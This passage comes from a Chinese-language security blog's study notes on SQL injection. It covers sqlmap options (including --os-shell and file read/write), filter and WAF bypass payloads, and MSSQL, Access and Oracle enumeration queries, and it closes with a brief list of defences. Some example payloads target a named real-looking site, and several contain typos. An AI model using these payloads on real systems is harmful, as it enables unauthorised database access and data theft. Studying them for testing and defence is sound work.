+<p>==空白符被过滤:==</p>
+<blockquote>
+<p><code>%09%0A %0B %0C %0D %A0 %20 /**/</code></p>
+</blockquote>
+<p>==盲注中过滤了<code>()</code>==</p>
+<blockquote>
+<p>like:搭配 <code>_</code>和<code>%</code></p>
+<p>regexp: 搭配正则表达式</p>
+</blockquote>
+</blockquote>
+<h3 id="相关函数绕过"><a href="#相关函数绕过" class="headerlink" title="相关函数绕过"></a>相关函数绕过</h3><blockquote>
+<ol>
+<li><p>strstr:对大小写敏感</p>
+</li>
+<li><p>空格绕过：</p>
+<blockquote>
+<p>使用内联注释</p>
+<p>换行符代替空格：<strong><em>Windows则换行符为%0A%0D，Linux则为%0A。*</em></strong></p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<h2 id="sqlmap进阶"><a href="#sqlmap进阶" class="headerlink" title="sqlmap进阶"></a>sqlmap进阶</h2><p><code>-- prefix  xxx</code>:闭合查询，例如<code>)))</code>,<code>&quot;&#39;</code>‘</p>
+<p><code>-- suffix</code>:注释</p>
+<blockquote>
+<p>sqlmap连接数据库</p>
+<p><code>python .\sqlmap.py -d &quot;mysql://root:011999@127.0.0.1:3306/test&quot; --banner --users</code></p>
+<p><code>-l 日志文件</code>:抓包的日志文件进行sql注入</p>
+<p><code>-X</code>:从sitemap.xml站点地图文件中读取目标探测</p>
+<p><code>-m</code>:对多个url进行探测</p>
+<p><code>-r</code>对请求头中的字段探测</p>
+<p><code>-c</code>：从配置文件中探测</p>
+<p><code>-f</code>:指纹信息</p>
+<p><code>-v</code>：6个探测等级，3的时候可以显示payload</p>
+<p>Google批量扫描：</p>
+<p><code>-g  &quot;inurl:.php?id=&quot;</code></p>
+<p>==设置http请求方法==</p>
+<p><code>--method=PUT</code></p>
+<p>设置为post提交：</p>
+<p><code>--data=&quot;id=1&quot;</code></p>
+<p>设置参数分隔符</p>
+<p><code>--param-del=&#39;&amp;&#39;</code>:用&amp;分割多个数据</p>
+<hr>
+<p>sqlmap设置请求头：</p>
+<hr>
+<p><code>--user-agent</code>:设置</p>
+<p><code>--random-&#39;agent</code>‘随机设置</p>
+<p><code>--referer</code></p>
+<p>==对以上的检测需要设置<code>--level</code>=3==</p>
+<p><code>--headers=&quot;user-agent:xxxx\ncookie:xxxxx&quot;</code></p>
+<hr>
+<p>sqlmap设置http协议认证：</p>
+<p><code>--auth-type Basic/DIgest/NTLM</code></p>
+<p><code>--auth-cred &quot;user:psw&quot;</code></p>
+<hr>
+<p><strong><em>设置代理</em></strong></p>
+<p><code>--proxy</code>http(s)://ip[:port]<br><code>--proxy-cred</code>‘usr:psw’</p>
+<p><code>--proxy-file</code> 多条代理</p>
+<p><code>--ignore-proxy</code> 忽略系统设置的代理</p>
+<hr>
+<p>设置tor网络</p>
+<p><code>--tor</code>开启</p>
+<p><code>--tor-port</code>指定端口</p>
+<p><code>--tor-type</code>类型</p>
+<p><code>--check-tor</code>检测可用</p>
+<hr>
+<p>设置延迟</p>
+<p><code>--delay 0.5</code>延迟0.5s</p>
+<hr>
+<p>设置超时&amp;连接次数</p>
+<p><code>--timeout 30.0</code>超时30s</p>
+<p><code>--retries count</code>默认3次</p>
+<hr>
+<p>设置随机化参数</p>
+<p><code>--randomize id</code>id对于的值变化</p>
+<hr>
+<p>设置日志过滤目标 </p>
+<p><code>-l burp.log --scope=&quot;(www)?.+/com&quot;</code></p>
+<hr>
+<p>设置忽略401</p>
+<p><code>---ignore-401</code>出现401继续探测</p>
+<p>绕过认证，直接探测</p>
+<hr>
+<p>设置http私钥</p>
+<p><code>--auth-firl</code>PEM格式文件</p>
+<hr>
+<p>设置安全模式</p>
+<p><strong><em>盲注过程中服务器销毁了会话</em></strong></p>
+<p><code>--safe-url</code>指定url</p>
+<p><code>--safe-post</code>post参数</p>
+<p><code>--safe-req</code>读取http请求文件 -r</p>
+<p><code>--safe-freq</code>多条http请求</p>
+<hr>
+<p>设置忽略url编码</p>
+<p>后端服务器不遵循RFC标准</p>
+<p><code>--skip-urlencode</code></p>
+</blockquote>
+<blockquote>
+<p>sqlmap性能优化</p>
+<hr>
+<p>持久http连接：<br><code>---keep-alive</code> connection:keep-alive</p>
+<p>加快探测速度</p>
+<hr>
+<p>设置空连接 检索没有body响应的内容</p>
+<p><code>--null-connection</code></p>
+<hr>
+<p>设置多线程</p>
+<p><code>--thread</code>10</p>
+<p>默认的线程数是1</p>
+<p>最大是10</p>
+<hr>
+<p>设置预测输出</p>
+<p><code>--predic-output</code></p>
+<p>与线程不兼容</p>
+<hr>
+<p>开启所有的性能优化参数</p>
+<p><code>-o</code></p>
+</blockquote>
+<blockquote>
+<p><code>-p</code>指定探测的参数</p>
+<p><code>-p &#39;id,user-agent&#39;</code></p>
+<hr>
+<p><code>--skip &#39;id&#39;</code></p>
+<p>忽略参数</p>
+<hr>
+<p>忽略非动态参数</p>
+<p><code>--skip-static</code></p>
+<hr>
+</blockquote>
+<p><strong><em>指定注入点</em></strong></p>
+<blockquote>
+<p><code>?id=1*</code>*指定的是payload注入的位置 </p>
+<hr>
+</blockquote>
+<p>自定义探测参数</p>
+<blockquote>
+<p>设置探测等级</p>
+<p><code>--level</code> 1~5</p>
+<p>cookie &gt;=2</p>
+<p>header&gt;=3</p>
+<hr>
+<p>设置风险参数</p>
+<p><code>--risk</code> 2：增加了基于查询时间的sql注入</p>
+<p>3：基于or</p>
+<hr>
+<p>设置页面比较参数</p>
+<p><code>--string</code>指定包含字符串 查询为true</p>
+<p><code>--not-string</code>指定包含字符串</p>
+<p><code>--regexp</code>正则表达式</p>
+<p><code>--code</code>:转态码</p>
+<hr>
+<p>设置内容比较参数</p>
+<p><code>--text-only</code>:页面中的文本</p>
+<p><code>--titles</code>对比标题</p>
+</blockquote>
+<p>设置具体sql注入技术</p>
+<blockquote>
+<p><code>--technique</code></p>
+<blockquote>
+<p>B:布尔注入</p>
+<p>E:报错注入</p>
+<p>U:联合查询注入</p>
+<p>S:堆叠注入</p>
+<p>T:基于时间的注入</p>
+<p>Q:内联查询注入</p>
+</blockquote>
+</blockquote>
+<p>设置盲注的时间</p>
+<blockquote>
+<p><code>-time-sec 3</code>延时3秒 默认5秒</p>
+</blockquote>
+<p>设置union字段数及探测的字符</p>
+<blockquote>
+<p><code>--union-cols</code>1-20</p>
+<hr>
+<p>设置指定的字符探测字段</p>
+<p><code>--union-char</code>1</p>
+<p>默认是NULL</p>
+</blockquote>
+<h4 id="常用参数"><a href="#常用参数" class="headerlink" title="==常用参数=="></a>==常用参数==</h4><blockquote>
+<p><code>-r</code>:加载http请求</p>
+<p><code>-m</code>:多目标探测</p>
+<p><code>--file-read</code>:读文件</p>
+<p><code>--file-write</code>:写</p>
+<p><code>--os-shell</code>:系统shell命令</p>
+<p><code>--os-shell</code>:数据库自带shell</p>
+<p><code>--random-agnet</code></p>
+<p><code>--headers</code>: 设置header参数</p>
+<p><code>referer</code>:</p>
+<p><code>-p</code>:指定参数</p>
+<p><code>--dbms</code>指定数据库</p>
+<p><code>-level</code>:5个等级</p>
+<p><code>--risk</code>:四个等级 </p>
+<p><code>--technique</code>:b e u s t</p>
+<p><code>--is-dba</code>:是否为管理员</p>
+</blockquote>
+<h3 id="tamper脚本编写"><a href="#tamper脚本编写" class="headerlink" title="tamper脚本编写"></a>tamper脚本编写</h3><blockquote>
+<p><code>_priorty</code> 设置优先级</p>
+<p><code>dependencies</code>:脚本使用范围</p>
+<p><code>tamper</code>:</p>
+<p>tamper使用需要设置<code>-v</code>大于等于3</p>
+</blockquote>
+<h3 id="mysql注入防御："><a href="#mysql注入防御：" class="headerlink" title="mysql注入防御："></a>mysql注入防御：</h3><blockquote>
+<ol>
+<li><p>打开魔术引号开关，或者使用<code>addslashes</code>函数对字符进行转义</p>
+<blockquote>
+<p>16进制编码和宽字节注入可以绕过</p>
+<p>（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）会自动转为含有反斜线的转义字符</p>
+</blockquote>
+</li>
+<li><p>有关数据库操作中使用<code>mysqli_real_escape_string</code>进行转义</p>
+</li>
+<li><p>关闭错误提示</p>
+<blockquote>
+<p>php.ini中的<code>display_errors=off</code></p>
+</blockquote>
+</li>
+<li><p><code>**htmlspecialchars()**</code></p>
+<blockquote>
+<p>对特殊的HTML中的标记进行HTML编码</p>
+</blockquote>
+</li>
+<li><p>正则匹配</p>
+<blockquote>
+<p>preg_match</p>
+<p> preg_match_all() </p>
+<p>preg_replace</p>
+</blockquote>
+</li>
+<li><p>最佳方式：预编译sql语句</p>
+<blockquote>
+<p>变量<img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/t017c3e178b42dbea96.png"  alt="http://p6.qhimg.com/t011554d1448b3f5840.png">处用<code>?</code>代替</p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<h2 id="Access注入"><a href="#Access注入" class="headerlink" title="Access注入"></a>Access注入</h2><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><blockquote>
+<p>Access注入中的联合查询 必须要有<code>from</code> 即必须要有数据库</p>
+<p>asp+Access  asp+mssql</p>
+<p>==只能管理一个库==</p>
+</blockquote>
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><blockquote>
+<p><code>len()</code></p>
+<p><code>asc</code></p>
+<p><code>mid()</code></p>
+</blockquote>
+<h3 id="基本语句、"><a href="#基本语句、" class="headerlink" title="基本语句、"></a>基本语句、</h3><blockquote>
+<p>==判断数据库==</p>
+<blockquote>
+<p><code>and exsits (select * from msysobjects)&gt;0 access</code></p>
+<p>``and exsits (select * from sysobjects)&gt;0 mssql`</p>
+</blockquote>
+<p>==判断表 手工猜测==</p>
+<p><code>and exsits (select * from xxx)</code></p>
+<p>==判断字段==</p>
+<p><code>and exsits (select xxx  from xxx)</code></p>
+<p>==判断列==</p>
+<p><code>order by x</code></p>
+<p>==判断显示位置==</p>
+<p><code>id =-1 and union select 1,2 3, .. from table</code></p>
+</blockquote>
+<h3 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h3><blockquote>
+<p>知道表名 不知道字段名</p>
+<p>借助数据库自连接查询使其内部结构乱序，从而偏移出我们所需要的内容</p>
+</blockquote>
+<blockquote>
+<p>首先判断字段数，如何用union，<code>*</code>代替字段，逐渐往前推</p>
+</blockquote>
+<blockquote>
+<p>判断字段数</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200602213421651.png"  alt="image-20200602213421651"></p>
+<p>偏移公式:<br><code>order by 列数 - num(table)x“*所代表的个数”</code></p>
+<p>连接两个表：</p>
+<p>18-2*4</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200602213551426.png"  alt="image-20200602213551426"></p>
+<p>连接三个表：</p>
+<p>18-3*4</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200602213805296.png"  alt="image-20200602213805296"></p>
+</blockquote>
+<h3 id="Access-跨库查询"><a href="#Access-跨库查询" class="headerlink" title="Access 跨库查询"></a>Access 跨库查询</h3><blockquote>
+<p><code>select xxx from [D://test//test_db].test.table</code></p>
+</blockquote>
+<h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><blockquote>
+<p>asp+mssql  asp+mysql  asp+Access(搭配做多）</p>
+<p>使用<code>T-SQL</code></p>
+</blockquote>
+<blockquote>
+<p>端口：1433</p>
+<p>文件类型：</p>
+<blockquote>
+<p>日志文件：<code>.ldf</code></p>
+<p>数据库文件：<code>.mdf</code></p>
+</blockquote>
+<p><code>from sqli.dbo.SQLi</code>库.架构.表</p>
+</blockquote>
+<h3 id="系统数据库"><a href="#系统数据库" class="headerlink" title="系统数据库"></a>系统数据库</h3><blockquote>
+<p><code>master</code>:对象信息 密码和用户</p>
+<p><code>tempdb</code>:临时数据 重启丢失</p>
+<p><code>model</code>:数据库模板</p>
+<p><code>msdb</code>任务调度之类的</p>
+</blockquote>
+<h3 id="权限："><a href="#权限：" class="headerlink" title="权限："></a>权限：</h3><blockquote>
+<p>最低权限：<code>public</code></p>
+<p>文件管理 数据库操作 :<code>user-adminstrators</code></p>
+<p>系统级别 :<code>sa</code></p>
+<p>==服务器角色==</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200603154118441.png"  alt="image-20200603154118441"></p>
+<p><strong><em>架构不代表权限</em></strong></p>
+<p>==数据库角色==</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200603154143697.png"  alt="image-20200603154143697"></p>
+<p>​     public角色</p>
+</blockquote>
+<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><blockquote>
+<p>==存储过程==</p>
+<blockquote>
+<p>完成一组功能 一次编译 多次执行</p>
+<p><code>xp_cmdshell</code></p>
+</blockquote>
+<p>==注释符号==</p>
+<blockquote>
+<p><code>/*</code></p>
+<p><code>--</code></p>
+<p><code>;%00</code></p>
+</blockquote>
+<p>==空白符==</p>
+<blockquote>
+<p><code>01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</code></p>
+<p><code>/**/</code></p>
+</blockquote>
+<p>==语法语义符号==</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt; &gt; 尖括号，用于分隔字符串，字符串为语法元素的名称，SQL语言的非终结符。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">::&#x3D; 定义操作符。用在生成规则中，分隔规则定义的元素和规则定义。 被定义的元素位于操作符的左边，规则定义位于操作符的右边。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[ ] 方括号表示规则中的可选元素。方括号中的规则部分可以明确指定也可以省略。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123; &#125; 花括号聚集规则中的元素。在花括号中的规则部分必须明确指定。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">() 括号是分组运算符</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>==判断数据库==</p>
+<blockquote>
+<p><code>and exsits (select * from msysobjects)&gt;0 access</code></p>
+<p>``and exsits (select * from sysobjects)&gt;0 mssql`</p>
+</blockquote>
+<p>==权限测试 服务器角色==</p>
+<blockquote>
+<p>==服务器角色==</p>
+<blockquote>
+<p><code>select  is _srvorlemember(&#39;sysadmin &#39;)</code></p>
+</blockquote>
+<p>判断是否是sa</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 http:&#x2F;&#x2F;IP:PORT&#x2F;less-1.asp?id&#x3D;5&#39; and exists(select is_srvrolemember(&#39;sysadmin&#39;))--</span><br><span class="line">2 或http:&#x2F;&#x2F;IP:PORT&#x2F;less-1.asp?id&#x3D;5&#39; and (select is_srvrolemember(&#39;sysadmin&#39;))&gt;0--</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>判断当前用户的读写权限:</p>
+<p><code>http://IP:PORT/less-1.asp?id=5&#39; and (select is_srvrolemember(&#39;db_owner&#39;))&gt;0--</code></p>
+</blockquote>
+<p>==基本信息==</p>
+<blockquote>
+<p><code>select  @@version</code></p>
+<p><code>db_name(num)</code>数据库名</p>
+<p><code>user</code></p>
+</blockquote>
+<p>==登录名==</p>
+<p><code>select  name ,loginname from master..syslogins,master..sysprocesses</code></p>
+<p>==数据库==</p>
+<blockquote>
+<p><code>select top 1 name from master..sysdatabases where dbid &gt;4</code></p>
+<blockquote>
+<p>top 2 : <code>&lt;&gt;</code> 嵌套 <code>not in</code></p>
+</blockquote>
+<p><code>select top 1 name from master..sysdatabases where dbid &gt;5</code></p>
+<p><code>select top 1 name from master..sysdatabases  for xml path)</code></p>
+<p><code>select db_name(1)</code></p>
+</blockquote>
+<p>==表名==</p>
+<blockquote>
+<p><code>select top 1 name from sysobjects where xtype=&quot;u&quot;)</code></p>
+<blockquote>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200603104542695.png"  alt="image-20200603104542695"></p>
+</blockquote>
+<p><code>select top 1 name from sysobjects for xml path</code></p>
+</blockquote>
+<p>==列名==</p>
+<blockquote>
+<p><code>select top 1 name from master..syscolumns where  id=(select id from sysobjects where name=&#39;admin&#39;)</code></p>
+</blockquote>
+<p>==判断站库分离==</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200603105231347.png"  alt="image-20200603105231347"></p>
+<p>==判断xp_cmdshell==</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200603105327238.png"  alt="image-20200603105327238"></p>
+<p><code>select count(*) FROM master. dbo.sysobjects Where xtype =&#39;X&#39; AND name = &#39;xp_cmdshell&#39;</code></p>
+</blockquote>
+<h2 id="oracke-amp-postgresql"><a href="#oracke-amp-postgresql" class="headerlink" title="oracke&amp;postgresql"></a>oracke&amp;postgresql</h2><blockquote>
+<p>使用<code>PLsql</code></p>
+<p>权限体制:</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200603092142550.png"  alt="image-20200603092142550"></p>
+<p>权限传递:</p>
+<blockquote>
+<p>系统权限传递 中如果中间人的权限被收回 则不影响下一级的权限</p>
+<p>实体权限的传递中 如果中间人的权限被收回 则下一级的权限也收回</p>
+</blockquote>
+</blockquote>
+<h3 id="相关表"><a href="#相关表" class="headerlink" title="相关表"></a>相关表</h3><blockquote>
+</blockquote>
+<h3 id="注入-1"><a href="#注入-1" class="headerlink" title="注入"></a>注入</h3><blockquote>
+<p>==规则==</p>
+<ol>
+<li>必须跟上表名查询 或者用虚表<code>dual</code></li>
+<li><code>union</code>拼接语句数据类型必须相同  可以一用<code>null</code>代替</li>
+<li>注释 <code>-- or /**/</code></li>
+</ol>
+<p>==判断列数==</p>
+<p><code>id =&quot;1&quot; order by 4 --</code></p>
+<p>==回显位==</p>
+<p><code>union  select  null ,null ,null  from dual  --</code></p>
+<p>==version==</p>
+<p><code>union  select  null  , (select  banner  from sys.v_$version where  rownum = 1),null  from  dual --</code></p>
+<blockquote>
+<p>mysql  Limi  </p>
+<p>mssql  top</p>
+<p>oracle  rownum</p>
+</blockquote>
+<p>==table==</p>
+<p><code>union select  null , (select  table_name  from user_tables  where rownnum =1),null  from dual --</code></p>
+<p><code>union select  null , (select  table_name  from user_tables  where rownnum =1 and table_name &lt;&gt;&#39;xxx &#39;),null  from dual --</code></p>
+<p>==column-=</p>
+<p><code>union select  null ,(select  column_name from  user_tab_columns where  table_name =&#39;xxx &#39; and rownum = 1) , null  from dual  --</code></p>
+<h4 id="error-i"><a href="#error-i" class="headerlink" title="error_i"></a>error_i</h4></blockquote>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><blockquote>
+<p>函数:<code>substr(xx,1,1)</code></p>
+<p><code>decode</code></p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200603094943411.png"  alt="image-20200603094943411"></p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200603095002967.png"  alt="image-20200603095002967"></p>
+</blockquote>
+<h3 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h3><blockquote>
+<p><code>DBMS_PIRE.RECEIVR_MESSAGE(任意值,延迟时间)</code></p>
+<p><code>select count(*) from all_objects</code> :消耗大量时间</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200603100423910.png"  alt="image-20200603100423910"></p>
+</blockquote>
+<h3 id="外带通信"><a href="#外带通信" class="headerlink" title="外带通信"></a>外带通信</h3><blockquote>
+<p><code>ceyei</code></p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200603100722398.png"  alt="image-20200603100722398"></p>
+</blockquote>
+<h3 id="提权-amp-RCE"><a href="#提权-amp-RCE" class="headerlink" title="提权&amp;RCE"></a>提权&amp;RCE</h3><blockquote>
+<p>==执行java==</p>
+</blockquote>
+<h2 id="数据库类型判断"><a href="#数据库类型判断" class="headerlink" title="数据库类型判断"></a>数据库类型判断</h2><blockquote>
+<p>ASP最多的就是 Access和MSSQL</p>
+<ol>
+<li><p>错误提示</p>
+<blockquote>
+<p>MSSQL内置的<code>user</code>变量</p>
+<blockquote>
+<p><code>index.asp?id=1 and user&gt;0</code></p>
+<p>user是<code>nvarchar</code></p>
+</blockquote>
+</blockquote>
+</li>
+<li><p>系统表中</p>
+<blockquote>
+<p><code>msysobjects</code>是access的系统表 存放数据库中</p>
+<p>国所有的对象 在web环境中读显示<strong><em>无权限</em></strong></p>
+<p><code>http://www.wenkuxiazai.com/showdetail.asp?id=49 and (select
+count(*) from msysobjects)&gt;0</code></p>
+<p><code>sysobjects</code>是mssql的,下不可以正常读取</p>
+<p><code>http://www.wenkuxiazai.com/showdetail.asp?id=49 and (select
+count(*) from sysobjects)&gt;0</code></p>
+<p>access两个都不同于原本的页面</p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<h3 id="bypass-1"><a href="#bypass-1" class="headerlink" title="bypass"></a>bypass</h3><blockquote>
+<ol>
+<li><p>大小写绕过</p>
+<blockquote>
+<p><code>id=1 UnIoN/**/SeLeCT 1,user()</code></p>
+</blockquote>
+</li>
+<li><p>替换关键词</p>
+<blockquote>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200604133909981.png"  alt="image-20200604133909981"></p>
+</blockquote>
+</li>
+<li><p>双重url编码</p>
+</li>
+</ol>
+<ol start="4">
+<li><p>变化请求格式</p>
+</li>
+<li><p>http参数污染</p>
+<blockquote>
+<p>提交多个id</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200604134144394.png"  alt="image-20200604134144394"></p>
+</blockquote>
+</li>
+<li><p>空白字符注释符绕过</p>
+<blockquote>
+<p><code>/**/</code></p>
+<p><code>/*!*/</code></p>
+<p>常见空白字符</p>
+<p><code>id=1%0aunion select 1,user() from admin</code></p>
+<p><code>其他形式如：%1%20、%3920、%40%20、%23%0a、%2d%2d%0a</code></p>
+</blockquote>
+</li>
+<li><p>浮点数绕过</p>
+<blockquote>
+<p><code>select * from users where id=8E0union select 1,2,3</code></p>
+<p><code>select * from users where id=8.0 select 1,2,3</code></p>
+</blockquote>
+</li>
+<li><p>括号绕过</p>
+<blockquote>
+<p>mysql中<code>()</code>中是子查询</p>
+<p><code>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</code></p>
+</blockquote>
+</li>
+<li><p>引号绕过</p>
+<blockquote>
+<p>16进制</p>
+<p><code>select column_name  from information_schema.tables where table_name=0x7573657273</code></p>
+<p>==%2527==</p>
+<blockquote>
+<p>%25=%—–&gt;%27=<code>&#39;</code></p>
+<p>绕过<code>magic_quotes_gpc</code></p>
+</blockquote>
+</blockquote>
+</li>
+<li><p>逗号绕过</p>
+<blockquote>
+<p>==对于<code>substr()和min()</code>可以用 <code>from to</code>==</p>
+<p><code>select substr(database() from 1 for 1);</code></p>
+<p><code>select mid(database() from 1 for 1);</code></p>
+<p>==<code>join</code>==</p>
+<p><code>union select 1,2</code>变为</p>
+<p><code>union select * from (select 1)a join (select 2)b</code></p>
+<p>==使用like 或者 ==</p>
+<blockquote>
+<p><code>select ascii(mid(user(),1,1))=80</code></p>
+<p><code>select user() like &#39;r%&#39;</code></p>
+</blockquote>
+<p>==limit==</p>
+<blockquote>
+<p><code>limit 0,1  ==  limit 1 offset 0</code></p>
+</blockquote>
+</blockquote>
+</li>
+<li><p>比较符号被过滤</p>
+<blockquote>
+<p>使用<code>greater 或者 least</code></p>
+<blockquote>
+<p><code>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</code></p>
+</blockquote>
+<p>使用between and</p>
+<blockquote>
+<p><code>between a and b = [a,b)</code></p>
+</blockquote>
+<p><code>or and xor not绕过：</code></p>
+<blockquote>
+<p><code>and=&amp;&amp;  or=||   xor=|   not=!</code></p>
+</blockquote>
+</blockquote>
+</li>
+<li><p><code>=</code>绕过</p>
+<blockquote>
+<p><code>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</code></p>
+</blockquote>
+</li>
+<li><p>关键词绕过</p>
+<blockquote>
+<p>大小写:</p>
+<p><code>id=-1&#39;UnIoN/**/SeLeCT</code></p>
+<p>内联注释:</p>
+<p><code>id=-1&#39;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</code></p>
+<p>双写:</p>
+<p><code>id=-1&#39;UNIunionONSeLselectECT1,2,3–-</code>1</p>
+<p>编码:</p>
+<p>url全编码或者char字符连接</p>
+<p><code>Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</code></p>
+</blockquote>
+</li>
+<li><p><code>\N</code></p>
+<blockquote>
+<p><code>ELECT * FROM admin WHERE username = \Nunion select 1,user() from admin</code></p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">LuoYu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://retnull.top/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">http://retnull.top/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://retnull.top" target="_blank">LuoYuのBLOG</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post_share"><div class="social-share" data-image="/img/test1.jpg" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/04/24/bugku-writeup-cookie%E6%AC%BA%E9%AA%97/"><img class="prev_cover lazyload" data-src="/img/test1.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">bugku_writeup_cookie欺骗</div></div></a></div><div class="next-post pull_right"><a href="/2020/04/23/bugku-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/"><img class="next_cover lazyload" data-src="/img/test4.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">bugku_速度要快</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By LuoYu</div><div class="framework-info"><span>驱动 </span><a href="https://retnullyu.github.io/" target="_blank" rel="noopener"><span>LuoYu</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://retnullyu.github.io/" target="_blank" rel="noopener"><span>LuoYuの主题</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script defer id="ribbon" src="/js/third-party/canvas-ribbon.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script id="canvas_nest" color="0,0,255" 